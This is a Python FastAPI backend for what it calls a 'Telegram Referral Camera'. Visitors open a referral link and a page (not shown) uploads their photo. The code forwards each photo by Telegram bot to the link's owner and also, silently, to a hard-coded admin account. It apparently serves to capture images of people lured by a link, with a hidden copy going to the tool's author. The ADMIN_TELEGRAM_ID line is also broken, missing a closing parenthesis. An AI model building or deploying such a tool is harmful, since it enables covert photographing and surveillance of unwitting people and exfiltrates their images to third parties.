import os
import json
from io import BytesIO
from pathlib import Path

from fastapi import FastAPI, Query, Request, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates

from aiogram import Bot
from dotenv import load_dotenv


load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_TELEGRAM_ID = int(
    os.getenv("ADMIN_TELEGRAM_ID", "600280511"
)

USERS_FILE = Path("users.json")

app = FastAPI(title="Telegram Referral Camera")

templates = Jinja2Templates(directory="templates")

bot = Bot(token=BOT_TOKEN)


def load_users():
    if not USERS_FILE.exists():
        return {
            "users": {},
            "total_users": 0
        }

    try:
        with USERS_FILE.open("r", encoding="utf-8") as file:
            return json.load(file)
    except (json.JSONDecodeError, OSError):
        return {
            "users": {},
            "total_users": 0
        }


@app.get("/", response_class=HTMLResponse)
async def home(
    request: Request,
    q: str = Query(default="")
):
    if not q:
        return """
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport"
                  content="width=device-width, initial-scale=1.0">
            <title>الرابط غير صحيح</title>
        </head>

        <body>
            <h2>❌ الرابط غير صحيح</h2>
            <p>يجب فتح رابط إحالة صالح.</p>
        </body>
        </html>
        """

    return templates.TemplateResponse(
        "index.html",
        {
            "request": request,
            "referral_id": q
        }
    )


@app.post("/upload-photo")
async def upload_photo(
    photo: UploadFile = File(...),
    referral_id: str = Form(...)
):
    users_data = load_users()

    user = users_data["users"].get(referral_id)

    if not user:
        return {
            "success": False,
            "message": "رابط الإحالة غير صالح."
        }

    image_bytes = await photo.read()

    owner_id = int(referral_id)

    username = user.get("username", "")
    name = user.get("name", "غير معروف")

    username_text = (
        f"@{username}"
        if username
        else "بدون username"
    )

    caption = (
        "📸 صورة جديدة\n\n"
        f"👤 صاحب الرابط: {name}\n"
        f"🔹 Username: {username_text}\n"
        f"🆔 Telegram ID: {owner_id}\n"
        f"🔗 Referral ID: {referral_id}"
    )

    # إرسال الصورة إلى صاحب الرابط
    await bot.send_photo(
        chat_id=owner_id,
        photo=BytesIO(image_bytes),
        caption=caption
    )

    # إرسال الصورة إلى المسؤول
    await bot.send_photo(
        chat_id=ADMIN_TELEGRAM_ID,
        photo=BytesIO(image_bytes),
        caption=caption
    )

    # زيادة عدد الإحالات
    user["referrals"] = user.get("referrals", 0) + 1

    with USERS_FILE.open("w", encoding="utf-8") as file:
        json.dump(
            users_data,
            file,
            ensure_ascii=False,
            indent=2
        )

    return {
        "success": True,
        "message": "تم إرسال الصورة بنجاح."
    }


@app.get("/health")
async def health():
    return {
        "status": "ok"
    }
